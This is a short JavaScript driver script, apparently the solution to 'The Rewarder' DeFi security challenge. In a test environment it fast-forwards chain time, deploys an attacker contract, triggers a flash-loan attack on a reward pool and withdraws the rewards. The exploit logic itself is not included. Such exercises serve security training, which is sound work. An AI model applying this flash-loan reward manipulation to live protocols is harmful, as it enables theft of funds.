/**
 * The Rewarder Attack - Proof of Concept
 * 
 * This script demonstrates how to exploit The Rewarder Pool
 * through flash loan manipulation of reward distribution.
 */

const { ether, time } = require('@openzeppelin/test-helpers');

async function executeAttack(
  attacker, 
  flashLoanPool, 
  rewarderPool, 
  liquidityToken, 
  rewardToken
) {
  console.log("Starting attack on The Rewarder Pool...");
  console.log(`Initial reward token balance: ${await rewardToken.balanceOf(attacker)}`);
  
  // Wait for a new reward round
  await time.increase(time.duration.days(5));
  
  // Deploy the attacker contract
  const TheRewarderAttacker = await ethers.getContractFactory("TheRewarderAttacker");
  const attackerContract = await TheRewarderAttacker.deploy(
    flashLoanPool.address,
    rewarderPool.address,
    liquidityToken.address,
    rewardToken.address
  );
  console.log(`Attacker contract deployed at: ${attackerContract.address}`);
  
  // Execute the attack
  await attackerContract.attack();
  
  // Withdraw rewards to attacker's account
  await attackerContract.withdrawRewards();
  
  console.log(`Final reward token balance: ${await rewardToken.balanceOf(attacker)}`);
  console.log("Attack completed successfully!");

  return await rewardToken.balanceOf(attacker);
}

module.exports = {
  executeAttack
};